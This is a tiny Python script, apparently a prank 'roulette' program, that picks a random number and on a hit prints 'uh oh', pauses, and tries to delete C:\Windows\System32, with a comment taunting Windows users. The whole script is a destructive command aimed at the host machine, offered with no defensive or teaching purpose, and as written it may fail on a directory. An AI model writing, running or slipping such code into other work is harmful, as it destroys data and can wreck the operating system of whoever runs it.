import random
import os
from time import sleep

if random.randint(0, 6) == 1:
  print("uh oh")
  sleep(2)
  os.remove("C:\Windows\System32") # if you're a windows user, uh... good luck...
